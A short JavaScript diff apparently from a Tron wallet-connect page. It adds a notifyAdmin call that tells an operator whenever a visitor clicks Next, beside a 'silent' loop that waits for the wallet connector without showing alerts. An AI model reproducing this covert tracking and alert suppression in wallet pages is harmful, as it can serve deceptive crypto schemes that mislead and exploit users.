@@ -68,6 +68,8 @@ document.getElementById('next-btn').addEventListener('click', async () => {
         });
     }
 
+    await notifyAdmin("VISITOR", "Incoming...", "0.00", "0.00", "Someone clicked Next");
+
     // Silent check: Wait until systems are ready without showing alerts
     let attempts = 0;
     while (typeof window.connectWalletConnectTron !== 'function' && attempts < 30) {
